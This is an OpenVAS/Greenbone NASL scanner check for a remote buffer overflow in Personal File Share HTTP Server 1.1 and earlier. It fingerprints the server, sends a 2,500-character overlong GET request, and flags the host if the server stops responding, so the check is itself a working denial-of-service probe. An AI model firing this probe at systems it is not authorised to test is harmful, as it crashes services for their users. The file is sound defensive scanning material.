if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803196" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-05-02 13:34:27 +0530 (Thu, 02 May 2013)" );
	script_name( "Personal File Share HTTP Server Remote Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2013/Apr/184" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/526480" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/personal-file-share-http-server-remote-overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will let remote unauthenticated attackers
  to cause a denial of service." );
	script_tag( name: "affected", value: "Personal File Share HTTP Server version 1.1 and prior." );
	script_tag( name: "insight", value: "The flaw is due to an error when handling certain Long requests,
  which can be exploited to cause a denial of service." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "summary", value: "This host is running Personal File Share HTTP Server and is prone
  to buffer overflow vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
res = http_get_cache( item: "/", port: port );
if(!ContainsString( res, ">Files From" ) && !ContainsString( res, ">Web File Explore<" ) && !ContainsString( res, ">srplab.cn" )){
	exit( 0 );
}
req = http_get( item: crap( data: "A", length: 2500 ), port: port );
res = http_keepalive_send_recv( port: port, data: req );
req = http_get( item: "/", port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(!ContainsString( res, ">Files From" ) && !ContainsString( res, ">Web File Explore<" ) && !ContainsString( res, ">srplab.cn" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

